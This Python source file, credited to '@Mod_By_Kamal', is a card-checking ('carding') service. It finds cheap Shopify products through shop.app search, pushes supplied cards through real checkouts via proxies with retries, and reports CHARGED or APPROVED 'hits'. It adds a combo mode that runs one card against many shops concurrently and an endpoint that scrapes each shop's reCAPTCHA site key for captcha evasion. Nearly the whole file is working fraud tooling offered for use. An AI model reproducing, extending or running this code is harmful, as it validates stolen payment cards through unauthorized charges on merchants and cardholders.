"""
CardCheckout API v5.1 — checker + built-in fetcher + combo + getkey.
"""
import os
import asyncio
import concurrent.futures
import functools
import json as _json
import logging
import random
import re
import time
import threading
import urllib.parse
import urllib.request
import html as _html
from typing import Optional, Tuple, List

from fastapi import FastAPI, Query, Request
from fastapi.responses import HTMLResponse, JSONResponse
from pydantic import BaseModel

from checkout_engine import run_checkout_for_card, normalize_proxy, parse_card_entry

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
logger = logging.getLogger("cardcheckout.api")

THREAD_WORKERS = int(os.environ.get("CHECKER_THREADS", "200"))
MAX_RETRIES    = int(os.environ.get("CHECKER_RETRIES", "1"))
CHECK_TIMEOUT  = float(os.environ.get("CHECK_TIMEOUT", "75"))

PRICE_FLOOR = 0.10
PRICE_CEIL  = 5.00
SEARCH_ENDPOINTS = [
    "https://shop.app/agents/search",
    "https://shop.app/web/api/catalog/search",
]
DEV_TAG = "@Mod_By_Kamal"
FETCH_CONCURRENCY = 4

_pool = concurrent.futures.ThreadPoolExecutor(max_workers=THREAD_WORKERS,
                                              thread_name_prefix="chk")
_active = 0
_active_lock = threading.Lock()


def _inc():
    global _active
    with _active_lock: _active += 1


def _dec():
    global _active
    with _active_lock: _active -= 1


app = FastAPI(title="CardCheckout API", version="5.1.0",
              docs_url=None, redoc_url=None)


class CheckRequest(BaseModel):
    card:     Optional[str] = None
    shop_url: Optional[str] = None
    proxy:    Optional[str] = None
    low:      bool = True


class CheckResponse(BaseModel):
    Response:    str  = "ERROR"
    CC:          str  = ""
    Price:       str  = ""
    Gate:        str  = "Shopify"
    Site:        str  = ""
    Charged:     str  = "False"
    status_code: str  = ""
    error:       str  = ""
    retryable:   bool = False
    receipt_url: str  = ""


class FetchItem(BaseModel):
    site:       str
    variant_id: str
    price:      str
    checkout:   str
    title:      str = ""
    dev:        str = DEV_TAG


class FetchResponse(BaseModel):
    keyword:    str
    price_band: str
    total:      int
    results:    List[FetchItem] = []


class ComboRequest(BaseModel):
    card:        Optional[str] = None
    keyword:     Optional[str] = None
    proxy:       Optional[str] = None
    max_sites:   int = 10
    concurrency: int = 8
    low:         bool = True


class ComboItem(BaseModel):
    site:        str
    status:      str = "ERROR"
    status_code: str = ""
    amount:      str = ""
    error:       str = ""
    retryable:   bool = False
    receipt_url: str = ""


class ComboResponse(BaseModel):
    keyword:      str  = ""
    sites_found:  int  = 0
    sites_tested: int  = 0
    hits:         int  = 0
    charged:      int  = 0
    approved:     int  = 0
    declined:     int  = 0
    errors:       int  = 0
    elapsed:      float = 0.0
    results:      List[ComboItem] = []


def _validate_proxy(raw):
    if not raw or not raw.strip():
        return None, CheckResponse(Response="ERROR", status_code="PROXY_REQUIRED",
                                   error="proxy is required", retryable=False)
    try:
        return normalize_proxy(raw), None
    except Exception as exc:
        return None, CheckResponse(Response="ERROR", status_code="PROXY_INVALID",
                                   error=f"Invalid proxy: {exc}", retryable=False)


def _validate_card(raw):
    import datetime as _dt
    if not raw or not raw.strip():
        return None, CheckResponse(Response="ERROR", status_code="CARD_REQUIRED",
                                   error="card is required", retryable=False)
    try:
        _n, _m, _y, _c = parse_card_entry(raw)
    except Exception as exc:
        return None, CheckResponse(Response="ERROR", status_code="CARD_INVALID",
                                   error=str(exc), retryable=False)
    now = _dt.datetime.utcnow()
    if _y < now.year or (_y == now.year and _m < now.month):
        return None, CheckResponse(Response="ERROR", status_code="CARD_EXPIRED",
                                   error=f"expired {_m:02d}/{_y}", retryable=False)
    return raw.strip(), None


def _validate_url(raw):
    if not raw or not raw.strip():
        return None, CheckResponse(Response="ERROR", status_code="URL_REQUIRED",
                                   error="shop url is required", retryable=False)
    url = raw.strip()
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    try:
        p = urllib.parse.urlparse(url)
        hn = p.hostname or ""
        if not hn or "." not in hn or " " in hn:
            raise ValueError(hn)
    except Exception:
        return None, CheckResponse(Response="ERROR", status_code="URL_INVALID",
                                   error=f"invalid url: {raw!r}", retryable=False)
    return url, None


def _build_response(res, shop_url=""):
    name = res.status.name
    return CheckResponse(
        Response=name, CC=res.card or "", Price=res.amount or "",
        Gate="Shopify", Site=shop_url or res.shop_url or "",
        Charged="True" if name == "CHARGED" else "False",
        status_code=res.status_code or "",
        error=str(res.error) if res.error else "",
        retryable=res.retryable,
        receipt_url=res.receipt_url or "")


def _site_from_url(url):
    if not url: return None
    try:
        p = urllib.parse.urlparse(url)
        if p.scheme and p.netloc: return f"{p.scheme}://{p.netloc}"
    except Exception:
        pass
    return None


def _fill_template(tpl, vid):
    if not tpl: return ""
    return (tpl.replace("{id}", vid).replace("{ID}", vid)
               .replace("%7Bid%7D", vid).replace("%7BID%7D", vid))


def _parse_markdown(text):
    if not text or not isinstance(text, str): return []
    if text.strip().startswith("# Error"): return []
    blocks = re.split(r"\n\s*---\s*\n", text)
    out = []
    for block in blocks:
        lines = [l.strip() for l in block.split("\n") if l.strip()]
        if len(lines) < 2: continue
        title = lines[0]
        if title.startswith("#"): continue
        m = re.search(r"\$\s*([\d.,]+)", lines[1])
        if not m: continue
        try: price = float(m.group(1).replace(",", ""))
        except Exception: continue
        if not (PRICE_FLOOR <= price <= PRICE_CEIL): continue
        product_url = checkout_tpl = product_id = ""
        for l in lines:
            if not product_url and re.match(r"^https?://", l, re.I) \
                and not re.match(r"^img:", l, re.I) \
                and not re.match(r"^checkout:", l, re.I) \
                and "/cart/" not in l:
                product_url = l
            if not checkout_tpl and re.match(r"^checkout:\s*", l, re.I):
                checkout_tpl = re.sub(r"^checkout:\s*", "", l, flags=re.I).strip()
            if not product_id and re.match(r"^id:\s*", l, re.I):
                product_id = re.sub(r"^id:\s*", "", l, flags=re.I).strip()
        vid = ""
        if product_url:
            vm = re.search(r"[?&]variant=(\d+)", product_url)
            if vm: vid = vm.group(1)
        if not vid:
            vm = re.search(r"\((\d{6,})\)", block)
            if vm: vid = vm.group(1)
        checkout = _fill_template(checkout_tpl, vid)
        if not checkout and product_url and vid:
            s = _site_from_url(product_url)
            if s: checkout = f"{s}/cart/{vid}:1"
        site = _site_from_url(product_url) or _site_from_url(checkout)
        if not site: continue
        out.append({"site": site, "variant_id": vid or product_id or "",
                    "price_num": price, "currency": "USD",
                    "checkout": checkout, "title": title, "available": True})
    return out


def _search_once(keyword):
    for base in SEARCH_ENDPOINTS:
        url = (f"{base}?query={urllib.parse.quote(keyword)}&limit=10"
               f"&ships_to=US&available_for_sale=1"
               f"&min_price={PRICE_FLOOR:.2f}&max_price={PRICE_CEIL:.2f}")
        try:
            req = urllib.request.Request(url, headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                              "AppleWebKit/537.36 (KHTML, like Gecko) "
                              "Chrome/124.0.0.0 Safari/537.36",
                "Accept": "text/markdown, text/plain, */*",
                "Accept-Language": "en-US,en;q=0.9",
                "Referer": "https://shop.app/",
            })
            with urllib.request.urlopen(req, timeout=20) as r:
                body = r.read().decode("utf-8", errors="replace")
            items = _parse_markdown(body)
            if items: return items
        except Exception:
            continue
    return []


def _fetch_all_sync(keyword, want):
    suffixes = ["", " cheap", " sale", " deal", " new", " mini"]
    passes = min(len(suffixes), max(3, (want // 10) + 2))
    queries = [keyword + s for s in suffixes[:passes]]
    all_items = []
    for i in range(0, len(queries), FETCH_CONCURRENCY):
        batch = queries[i:i + FETCH_CONCURRENCY]
        with concurrent.futures.ThreadPoolExecutor(max_workers=len(batch)) as ex:
            for fut in concurrent.futures.as_completed(
                [ex.submit(_search_once, q) for q in batch]
            ):
                try: all_items.extend(fut.result())
                except Exception: pass
        if len(all_items) >= want * 2: break
    seen, unique = set(), []
    for v in all_items:
        k = v["variant_id"] or v["checkout"]
        if not k or k in seen: continue
        seen.add(k); unique.append(v)
    return unique[:want]


async def _fetch_sites_async(keyword, want):
    loop = asyncio.get_running_loop()
    try:
        return await asyncio.wait_for(
            loop.run_in_executor(_pool, _fetch_all_sync, keyword, want),
            timeout=45)
    except Exception as e:
        logger.warning(f"fetch failed: {e}")
        return []


def _dedupe_sites(sites):
    seen, out = set(), []
    for s in sites:
        try: h = (urllib.parse.urlparse(s).hostname or s).lower()
        except Exception: h = s.lower()
        if h and h not in seen:
            seen.add(h); out.append(s if s.startswith("http") else f"https://{h}")
    return out


async def _run_check(shop_url, card, proxy_url, low):
    loop = asyncio.get_running_loop()
    attempts = 1 + MAX_RETRIES
    last = None
    for attempt in range(1, attempts + 1):
        t0 = time.perf_counter()
        _inc()
        try:
            fn = functools.partial(run_checkout_for_card, shop_url, card, proxy_url, low)
            res = await asyncio.wait_for(
                loop.run_in_executor(_pool, fn), timeout=CHECK_TIMEOUT)
        except asyncio.TimeoutError:
            last = CheckResponse(Response="ERROR", status_code="TIMEOUT",
                                 error=f"hard-timeout {CHECK_TIMEOUT}s", retryable=True)
            continue
        except Exception as exc:
            last = CheckResponse(Response="ERROR", error=str(exc), retryable=True)
            continue
        finally:
            _dec()

        resp = _build_response(res, shop_url)
        logger.info("attempt %d/%d | %s | %s | %.1fs | %s",
                    attempt, attempts, resp.Response, resp.status_code or "-",
                    time.perf_counter() - t0, shop_url)
        if resp.Response in ("CHARGED", "APPROVED"):
            logger.info("HIT | %s | %s | %s", resp.Response, resp.Price, shop_url)

        if not resp.retryable or attempt == attempts: return resp
        await asyncio.sleep(min(2.0, 0.4 * (2 ** (attempt - 1))) + random.random() * 0.3)
        last = resp
    return last


async def _run_combo(req):
    t0 = time.time()
    card_val, err = _validate_card(req.card or "")
    if err:
        return ComboResponse(errors=1, results=[ComboItem(site="", error=str(err.error))])
    proxy_val, err = _validate_proxy(req.proxy or "")
    if err:
        return ComboResponse(errors=1, results=[ComboItem(site="", error=str(err.error))])

    keyword = req.keyword or "socks"
    variants = await _fetch_sites_async(keyword, min(req.max_sites * 5, 500))
    sites = [v["site"] for v in variants]
    sites_found = len(sites)
    unique = _dedupe_sites(sites)[: max(1, min(req.max_sites, 100))]

    logger.info(f"combo: kw={keyword!r} found={sites_found} unique={len(unique)}")
    if not unique:
        return ComboResponse(keyword=keyword, sites_found=sites_found,
                             elapsed=round(time.time() - t0, 2))

    concurrency = max(1, min(req.concurrency, 50))
    sem = asyncio.Semaphore(concurrency)

    async def bounded(url):
        async with sem:
            try: return await _run_check(url, card_val, proxy_val, req.low)
            except Exception as e:
                return CheckResponse(Response="ERROR", error=str(e), retryable=True)

    results = await asyncio.gather(*[bounded(u) for u in unique],
                                   return_exceptions=True)
    elapsed = round(time.time() - t0, 2)
    out, c = [], {"hits": 0, "charged": 0, "approved": 0, "declined": 0, "errors": 0}
    for url, r in zip(unique, results):
        if isinstance(r, Exception):
            out.append(ComboItem(site=url, status="ERROR", error=str(r)[:100]))
            c["errors"] += 1; continue
        st = r.Response
        out.append(ComboItem(site=url, status=st,
                             status_code=r.status_code or "",
                             amount=r.Price or "",
                             error=r.error or "",
                             retryable=r.retryable,
                             receipt_url=r.receipt_url or ""))
        if st == "CHARGED": c["charged"] += 1; c["hits"] += 1
        elif st == "APPROVED": c["approved"] += 1; c["hits"] += 1
        elif st == "DECLINED": c["declined"] += 1
        else: c["errors"] += 1

    return ComboResponse(keyword=keyword, sites_found=sites_found,
                         sites_tested=len(unique),
                         hits=c["hits"], charged=c["charged"], approved=c["approved"],
                         declined=c["declined"], errors=c["errors"],
                         elapsed=elapsed, results=out)


@app.get("/health", tags=["meta"])
async def health():
    with _active_lock: active = _active
    return {"ok": True, "threads": THREAD_WORKERS, "retries": MAX_RETRIES,
            "timeout": CHECK_TIMEOUT, "active_checks": active,
            "price_band": f"${PRICE_FLOOR:.2f} – ${PRICE_CEIL:.2f}",
            "fetcher": "built-in"}


@app.get("/", include_in_schema=False)
async def root(request: Request):
    raw = request.url.query
    if raw and "|" in raw.split("&", 1)[0]:
        parts = raw.split("&")
        card_raw = urllib.parse.unquote(parts[0])
        params = {}
        for p in parts[1:]:
            if "=" in p:
                k, v = p.split("=", 1)
                params[k.lower()] = urllib.parse.unquote(v)
        proxy   = params.get("proxy", "") or params.get("p", "")
        url     = params.get("url", "") or params.get("site", "") or params.get("u", "")
        keyword = params.get("kw", "") or params.get("keyword", "") or params.get("k", "")
        low     = params.get("low", "true").lower() in ("1", "true", "yes")

        card_val, err = _validate_card(card_raw)
        if err: return JSONResponse(content=err.model_dump())
        proxy_val, err = _validate_proxy(proxy)
        if err:
            err.CC = card_raw
            return JSONResponse(content=err.model_dump())

        if url:
            url_val, err = _validate_url(url)
            if err:
                err.CC = card_raw
                return JSONResponse(content=err.model_dump())
            resp = await _run_check(url_val, card_val, proxy_val, low)
            return JSONResponse(content=resp.model_dump())
        else:
            resp = await _run_combo(ComboRequest(
                card=card_val, keyword=keyword or "socks",
                proxy=proxy, max_sites=int(params.get("max", "10")),
                concurrency=int(params.get("conc", "8")), low=low))
            return JSONResponse(content=resp.model_dump())

    return HTMLResponse(_DOCS_HTML)


@app.get("/check", response_model=CheckResponse, tags=["check"])
async def check_get(card: str = Query(...), url: str = Query(...),
                    proxy: str = Query(...), low: str = Query(default="true")):
    card_val, err = _validate_card(card)
    if err:
        err.CC = card; return err
    url_val, err = _validate_url(url)
    if err:
        err.CC = card; err.Site = url; return err
    proxy_val, err = _validate_proxy(proxy)
    if err:
        err.CC = card; err.Site = url_val; return err
    return await _run_check(url_val, card_val, proxy_val,
                            low.strip().lower() in ("1", "true", "yes"))


@app.post("/check", response_model=CheckResponse, tags=["check"])
async def check_post(req: CheckRequest):
    c = req.card or ""; u = req.shop_url or ""
    card_val, err = _validate_card(c)
    if err:
        err.CC = c; return err
    url_val, err = _validate_url(u)
    if err:
        err.CC = c; err.Site = u; return err
    proxy_val, err = _validate_proxy(req.proxy or "")
    if err:
        err.CC = c; err.Site = url_val; return err
    return await _run_check(url_val, card_val, proxy_val, req.low)


@app.get("/fetch", response_model=FetchResponse, tags=["fetch"])
async def fetch_get(keyword: str = Query(...), result: int = Query(default=20, ge=1, le=500)):
    variants = await _fetch_sites_async(keyword, result)
    items = [FetchItem(site=v["site"], variant_id=v["variant_id"],
                       price=f"{v['price_num']:.2f} {v['currency']}",
                       checkout=v["checkout"], title=v["title"][:80])
             for v in variants]
    return FetchResponse(keyword=keyword,
                         price_band=f"${PRICE_FLOOR:.2f} – ${PRICE_CEIL:.2f}",
                         total=len(items), results=items)


@app.post("/combo", response_model=ComboResponse, tags=["combo"])
async def combo_post(req: ComboRequest):
    return await _run_combo(req)


@app.post("/auto", response_model=ComboResponse, tags=["combo"])
async def auto_post(req: ComboRequest):
    return await _run_combo(req)


@app.get("/combo", response_model=ComboResponse, tags=["combo"])
async def combo_get(card: str = Query(...), keyword: str = Query(default="socks"),
                    proxy: str = Query(...), max_sites: int = Query(default=10),
                    low: str = Query(default="true")):
    return await _run_combo(ComboRequest(
        card=card, keyword=keyword, proxy=proxy, max_sites=max_sites,
        low=low.strip().lower() in ("1", "true", "yes")))


@app.get("/getkey", include_in_schema=False)
async def getkey_route(url: str = Query(...), proxy: str = Query("")):
    import re as _re
    from checkout_engine import TLSClient

    shop = url.rstrip("/")
    if not shop.startswith(("http://", "https://")):
        shop = "https://" + shop

    proxy_url = ""
    if proxy:
        try:
            proxy_url = normalize_proxy(proxy)
        except Exception as e:
            return {"error": f"invalid proxy: {e}"}

    client = TLSClient(timeout=20, proxy_url=proxy_url)
    try:
        r = client.get(f"{shop}/products.json?limit=250")
        products = r.json().get("products", [])
        variant = None
        for p in products:
            for v in p.get("variants", []):
                if v.get("available"):
                    variant = v["id"]; break
            if variant: break
        if not variant:
            return {"error": "no product available"}

        r = client.get(f"{shop}/cart/{variant}:1", allow_redirects=True)
        checkout_html = r.text
        checkout_url = r.url

        decoded = _html.unescape(checkout_html).replace("&quot;", '"')
        found = set()
        for pat in [
            r'recaptcha/enterprise\.js\?render=([A-Za-z0-9_\-]{20,})',
            r'recaptcha/api\.js\?render=([A-Za-z0-9_\-]{20,})',
            r'"recaptchaSiteKey"\s*:\s*"([^"]+)"',
            r'"recaptcha_site_key"\s*:\s*"([^"]+)"',
            r'"captchaSiteKey"\s*:\s*"([^"]+)"',
            r'"checkpointCaptchaSiteKey"\s*:\s*"([^"]+)"',
            r'"siteKey"\s*:\s*"([^"]+)"',
            r'"sitekey"\s*:\s*"([^"]+)"',
            r'data-sitekey\s*=\s*"([^"]+)"',
            r'\b(6L[A-Za-z0-9_\-]{38})\b',
            r'\b(6A[A-Za-z0-9_\-]{38})\b',
        ]:
            for m in _re.finditer(pat, decoded):
                k = m.group(1)
                if k.startswith(("6L", "6A")):
                    found.add(k)

        if not found:
            js_urls = set()
            for m in _re.finditer(r'<script[^>]+src="([^"]+)"', checkout_html):
                u = m.group(1)
                if u.startswith("//"): u = "https:" + u
                elif u.startswith("/"): u = shop + u
                elif not u.startswith("http"): continue
                js_urls.add(u)
            for u in js_urls:
                try:
                    r2 = client.get(u, headers={"Referer": checkout_url})
                    if r2.status_code != 200: continue
                    body = _html.unescape(r2.text).replace("&quot;", '"')
                    for m in _re.finditer(r'\b(6L[A-Za-z0-9_\-]{38})\b', body):
                        found.add(m.group(1))
                except Exception:
                    continue

        host = urllib.parse.urlparse(shop).hostname or ""
        return {
            "shop": shop,
            "checkout_url": checkout_url,
            "sitekeys_found": list(found),
            "hardcode_line": (f'    "{host}": "{list(found)[0]}",'
                              if found else "none"),
        }
    finally:
        client.close()


@app.on_event("shutdown")
async def _shutdown():
    _pool.shutdown(wait=False, cancel_futures=True)


_DOCS_HTML = """<!DOCTYPE html>
<html><head><meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>CardCheckout API v5.1</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet"/>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#03030a;color:#f1f5f9;font-family:Inter,sans-serif;padding:32px 20px;line-height:1.6}
.wrap{max-width:900px;margin:0 auto}
h1{font-size:30px;font-weight:800;margin-bottom:8px}
h1 span{background:linear-gradient(135deg,#a78bfa,#38bdf8);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
p.sub{color:#94a3b8;margin-bottom:28px}
.card{background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.08);border-radius:12px;padding:20px;margin-bottom:14px}
.card h3{font-size:14px;font-family:'JetBrains Mono',monospace;color:#a78bfa;margin-bottom:10px;text-transform:uppercase;letter-spacing:1px}
code{background:rgba(139,92,246,.12);color:#c4b5fd;padding:2px 7px;border-radius:5px;font-family:'JetBrains Mono',monospace;font-size:12.5px}
pre{background:rgba(0,0,0,.5);padding:12px;border-radius:8px;font-family:'JetBrains Mono',monospace;font-size:12px;overflow-x:auto;margin:10px 0}
a{color:#38bdf8;text-decoration:none}a:hover{text-decoration:underline}
</style></head><body><div class="wrap">
<h1>CardCheckout <span>API v5.1</span></h1>
<p class="sub">Fetcher + checker + combo + getkey. Price band $0.10–$5.00.</p>

<div class="card">
<h3>Raw URL</h3>
<pre>GET /?CARD&amp;proxy=host:port:user:pass</pre>
<pre>GET /?CARD&amp;proxy=...&amp;url=https://store.com</pre>
<pre>GET /?CARD&amp;proxy=...&amp;kw=sticker&amp;max=5</pre>
</div>

<div class="card">
<h3>Endpoints</h3>
<p><a href="/health">/health</a></p>
<p><code>/fetch?keyword=socks&result=20</code></p>
<p><code>/check?card=..&url=..&proxy=..</code></p>
<p><code>/combo</code> · <code>/auto</code> — POST with <code>{card, keyword, proxy, max_sites}</code></p>
<p><code>/getkey?url=..&proxy=..</code> — find shop's captcha sitekey</p>
</div>
</div></body></html>
"""


if __name__ == "__main__":
    import uvicorn
    port = int(os.environ.get("PORT", "8000"))
    uvicorn.run(app, host="0.0.0.0", port=port, log_level="warning")
